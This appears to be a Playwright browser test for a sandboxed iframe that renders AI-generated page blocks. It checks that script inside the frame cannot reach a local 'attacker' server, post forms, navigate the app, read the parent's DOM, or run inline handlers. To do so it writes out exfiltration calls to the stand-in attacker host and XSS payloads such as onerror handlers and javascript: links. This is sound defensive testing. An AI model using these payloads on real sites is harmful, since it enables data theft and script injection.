// @vitest-environment node
// The island in a real browser (Chromium through Playwright), served with the production headers: even with script
// running inside it (as if the sanitizer, the runtime's second wall AND Trusted Types had all failed), it cannot
// fetch or beacon anything, submit a form, navigate or open windows, or read the app's DOM; inline script and
// handlers never run. And gate 5 measures a block at the 3 device widths.
//
// Three local origins: the app (a test page that frames the island), the preview origin (the built runtime) and an
// «attacker» that counts every request it gets. Skipped when Chromium is not installed (`npx playwright install`).
import { existsSync } from "node:fs";
import { mkdtemp, rm } from "node:fs/promises";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { responsiveGate, sanitizeBlock, type DeviceMeasure } from "@dialmade/ai-render";
import { compileAiCss } from "@dialmade/ai-render/css";
import { chromium, type Browser, type Frame, type Page } from "playwright";
import { build } from "vite";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createPreviewServer } from "../scripts/server.ts";

const hasChromium = (() => {
  try {
    return existsSync(chromium.executablePath());
  } catch {
    return false;
  }
})();

const listen = (server: Server) =>
  new Promise<string>((resolve) => server.listen(0, "127.0.0.1", () => resolve(`http://127.0.0.1:${(server.address() as AddressInfo).port}`)));
const close = (server: Server) => new Promise<void>((resolve) => server.close(() => resolve()));
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/** The app page: a secret, one island, and the island's messages in `window.messages`. */
const appPage = (islandSrc: string) => `<!doctype html><html><head><meta charset="utf-8"><title>app</title></head><body>
<div id="secret">top secret</div>
<iframe id="island" sandbox="allow-scripts" src="${islandSrc}" style="width:1000px;height:600px;border:0"></iframe>
<script>
  window.messages = [];
  window.addEventListener("message", (event) => {
    if (event.source === document.getElementById("island").contentWindow) window.messages.push(event.data);
  });
  window.post = (message) => document.getElementById("island").contentWindow.postMessage(message, "*");
</script></body></html>`;

describe.skipIf(!hasChromium)("the island in a real browser (CSP + sandbox)", () => {
  let dist = "";
  const servers: Server[] = [];
  let attackerUrl = "";
  const attackerHits: string[] = [];
  let browser: Browser;
  let page: Page;
  let island: Frame;
  let appUrl = "";

  beforeAll(async () => {
    dist = await mkdtemp(join(tmpdir(), "dl-preview-"));
    await build({ root: join(import.meta.dirname, ".."), logLevel: "silent", build: { outDir: dist, emptyOutDir: true } });

    const attacker = createServer((request, response) => {
      attackerHits.push(`${request.method} ${request.url}`);
      response.writeHead(200, { "Access-Control-Allow-Origin": "*", "Content-Type": "text/plain" }).end("pwned");
    });
    servers.push(attacker);
    attackerUrl = await listen(attacker);

    // The app's origin must be known before the preview server (frame-ancestors): reserve its port first.
    let islandSrc = "";
    const app = createServer((_request, response) => response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" }).end(appPage(islandSrc)));
    servers.push(app);
    appUrl = await listen(app);
    const preview = createPreviewServer(dist, appUrl);
    servers.push(preview);
    const previewUrl = await listen(preview);
    islandSrc = `${previewUrl}/island.html?parent=${encodeURIComponent(appUrl)}`;

    browser = await chromium.launch();
    page = await browser.newPage();
    await page.goto(appUrl);
    await page.waitForFunction(() => (window as unknown as { messages: { type: string }[] }).messages.some((m) => m.type === "ready"));
    island = page.frames().find((frame) => frame.url().includes("/island.html"))!;
  }, 120_000);

  afterAll(async () => {
    await browser?.close();
    await Promise.all(servers.map(close));
    if (dist) await rm(dist, { recursive: true, force: true });
  });

  /** Runs `attack` inside the island, waits for stray requests, and returns its result. */
  async function insideIsland<T>(attack: (attacker: string) => Promise<T> | T): Promise<T> {
    const result = await island.evaluate(attack, attackerUrl);
    await sleep(400);
    return result;
  }

  it("cannot reach the network: fetch, XHR, beacon, images, sockets, imports, workers, CSS", async () => {
    const results = await insideIsland(async (attacker) => {
      const out: Record<string, string> = {};
      const attempt = async (name: string, run: () => unknown) => {
        try {
          await run();
          out[name] = "ok";
        } catch (error) {
          out[name] = (error as Error).name || "error";
        }
      };
      await attempt("fetch", () => fetch(`${attacker}/fetch`));
      await attempt("xhr", () => new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", `${attacker}/xhr`);
        xhr.onload = resolve;
        xhr.onerror = () => reject(new Error("xhr"));
        xhr.send();
      }));
      await attempt("beacon", () => {
        if (!navigator.sendBeacon(`${attacker}/beacon`, "x")) throw new Error("refused");
      });
      await attempt("image", () => new Promise((resolve, reject) => {
        const image = new Image();
        image.onload = resolve;
        image.onerror = () => reject(new Error("image"));
        image.src = `${attacker}/image.png`;
      }));
      await attempt("websocket", () => new Promise((resolve, reject) => {
        const socket = new WebSocket(attacker.replace("http", "ws"));
        socket.onopen = resolve;
        socket.onerror = () => reject(new Error("socket"));
      }));
      await attempt("import", () => import(/* @vite-ignore */ `${attacker}/module.js`));
      await attempt("worker", () => new Worker(`${attacker}/worker.js`));
      await attempt("css", () => new Promise((resolve, reject) => {
        const link = document.createElement("link");
        link.rel = "stylesheet";
        link.href = `${attacker}/style.css`;
        link.onload = resolve;
        link.onerror = () => reject(new Error("css"));
        document.head.append(link);
      }));
      return out;
    });
    // `sendBeacon` only queues (it returns true even when the CSP then blocks the request): the attacker's count is
    // the proof for it, as for everything else.
    for (const [name, outcome] of Object.entries(results)) if (name !== "beacon") expect(outcome, name).not.toBe("ok");
    expect(attackerHits).toEqual([]);
  });

  it("cannot submit a form", async () => {
    const before = island.url();
    await insideIsland((attacker) => {
      const form = document.createElement("form");
      form.action = `${attacker}/form`;
      form.method = "post";
      const input = document.createElement("input");
      input.name = "password";
      input.value = "hunter2";
      form.append(input);
      document.body.append(form);
      form.submit();
      try {
        form.requestSubmit();
      } catch {
        /* blocked */
      }
    });
    expect(attackerHits).toEqual([]);
    expect(island.url()).toBe(before);
  });

  it("cannot navigate the app or open windows", async () => {
    const result = await insideIsland((attacker) => {
      const out: string[] = [];
      try {
        window.top!.location.href = `${attacker}/top`;
        out.push("top: no error");
      } catch (error) {
        out.push(`top: ${(error as Error).name}`);
      }
      try {
        window.parent.location.replace(`${attacker}/parent`);
        out.push("parent: no error");
      } catch (error) {
        out.push(`parent: ${(error as Error).name}`);
      }
      out.push(`open: ${window.open(`${attacker}/popup`) === null ? "null" : "window"}`);
      const link = document.createElement("a");
      link.href = `${attacker}/link`;
      link.target = "_top";
      document.body.append(link);
      link.click();
      return out;
    });
    expect(result).toContain("open: null");
    expect(page.url()).toBe(`${appUrl}/`);
    expect(page.context().pages()).toHaveLength(1);
    expect(attackerHits).toEqual([]);
  });

  it("cannot read the app's DOM, storage or cookies", async () => {
    const result = await insideIsland(() => {
      const read = (name: string, run: () => unknown) => {
        try {
          return `${name}: ${String(run())}`;
        } catch (error) {
          return `${name}: ${(error as Error).name}`;
        }
      };
      return [
        read("parent", () => window.parent.document.getElementById("secret")?.textContent),
        read("top", () => window.top!.document.body.innerHTML),
        read("cookie", () => document.cookie),
        read("storage", () => window.localStorage.length),
        read("origin", () => window.origin),
      ];
    });
    expect(result).toEqual(["parent: SecurityError", "top: SecurityError", "cookie: SecurityError", "storage: SecurityError", "origin: null"]);
  });

  it("never runs inline script or handlers, even if markup got in", async () => {
    const result = await insideIsland(async () => {
      const out: string[] = [];
      const flag = () => (window as unknown as { pwned?: boolean }).pwned === true;
      try {
        document.body.innerHTML = '<img src="x" onerror="window.pwned=true">';
        out.push("innerHTML: allowed");
      } catch (error) {
        out.push(`innerHTML: ${(error as Error).name}`);
      }
      try {
        const script = document.createElement("script");
        script.textContent = "window.pwned = true";
        document.body.append(script);
        out.push("script: appended");
      } catch (error) {
        out.push(`script: ${(error as Error).name}`);
      }
      try {
        const div = document.createElement("div");
        div.setAttribute("onclick", "window.pwned = true");
        document.body.append(div);
        div.click();
        out.push("handler: set");
      } catch (error) {
        out.push(`handler: ${(error as Error).name}`);
      }
      // (Not `eval` itself: DevTools evaluation, which Playwright uses, is allowed to eval whatever the CSP says.)
      try {
        setTimeout("window.pwned = true" as unknown as () => void, 0);
        out.push("timer: set");
      } catch (error) {
        out.push(`timer: ${(error as Error).name}`);
      }
      await new Promise((resolve) => setTimeout(resolve, 100));
      out.push(`pwned: ${flag()}`);
      return out;
    });
    expect(result).toContain("innerHTML: TypeError");
    expect(result).toContain("handler: TypeError");
    expect(result).toContain("timer: TypeError");
    expect(result.at(-1)).toBe("pwned: false");
  });

  it("raw hostile HTML posted by the app is neutralized by the runtime's second wall", async () => {
    await page.evaluate(
      ({ attacker }) => {
        (window as unknown as { post: (message: unknown) => void }).post({
          type: "render",
          v: 1,
          blockId: "b-hero",
          html: `<section data-block-id="b-hero"><img src="${attacker}/img" onerror="window.pwned=true"><a href="javascript:alert(1)" id="x">x</a><form action="${attacker}/f"><button>go</button></form><svg onload="window.pwned=true"></svg><p>ok</p></section>`,
          css: "",
          vars: {},
          mode: "light",
          fontsHref: null,
          editable: false,
          lang: "es",
        });
      },
      { attacker: attackerUrl },
    );
    await sleep(400);
    const dom = await island.evaluate(() => document.getElementById("dl-island")!.innerHTML);
    expect(dom).not.toMatch(/onerror|onload|javascript:|<form|<svg onload|src=/);
    expect(dom).toContain("<p>ok</p>");
    expect(await island.evaluate(() => (window as unknown as { pwned?: boolean }).pwned === true)).toBe(false);
    expect(attackerHits).toEqual([]);
  });

  it("gate 5: measures the block at the 3 widths of its cell", async () => {
    const raw = `<section data-block-id="b-feat" class="@container p-4"><div class="flex gap-4"><div class="w-96 shrink-0 bg-card p-4"><h2 class="text-h2">Agenda</h2></div><div class="w-96 shrink-0 bg-card p-4"><h2 class="text-h2">Cobros</h2></div></div><button type="button" class="size-4 bg-primary" aria-label="Cerrar"></button></section>`;
    const sanitized = sanitizeBlock(raw, { blockId: "b-feat", screenIds: [] });
    if (!sanitized.ok) throw new Error(sanitized.failure);
    const css = await compileAiCss(sanitized.html.match(/class="([^"]*)"/g)!.flatMap((m) => m.slice(7, -1).split(" ")));
    await page.evaluate(() => ((window as unknown as { messages: unknown[] }).messages = []));
    await page.evaluate(
      ({ html, css }) => {
        const post = (window as unknown as { post: (message: unknown) => void }).post;
        post({ type: "render", v: 1, blockId: "b-feat", html, css, vars: { "--card": "#eeeeee", "--primary": "#1d4ed8" }, mode: "light", fontsHref: null, editable: false, lang: "es" });
        post({ type: "measure", v: 1, widths: [1200, 768, 358] });
      },
      { html: sanitized.html, css },
    );
    await page.waitForFunction(() => (window as unknown as { messages: { type: string }[] }).messages.filter((m) => m.type === "measure").length >= 4);
    const measures = (await page.evaluate(() => (window as unknown as { messages: { type: string }[] }).messages.filter((m) => m.type === "measure"))) as unknown as (DeviceMeasure & { blockId: string })[];
    const byWidth = new Map(measures.map((m) => [m.width, m]));
    expect(byWidth.get(1200)?.overflowX).toBe(false);
    expect(byWidth.get(358)?.overflowX).toBe(true);
    expect(byWidth.get(768)?.overflowX).toBe(true);
    expect(byWidth.get(358)?.smallTargets).toBe(1);
    const devices = { 1200: "desktop", 768: "tablet", 358: "mobile" } as const;
    const verdict = responsiveGate(
      [1200, 768, 358].map((width) => ({ ...byWidth.get(width)!, device: devices[width as keyof typeof devices] })),
    );
    expect(verdict.responsive).toBe("warn");
    expect(verdict.warnings).toContainEqual({ code: "overflow", detail: "mobile · 358px" });
    // The island went back to its own width.
    expect(await island.evaluate(() => document.getElementById("dl-island")!.style.width)).toBe("");
  });
});
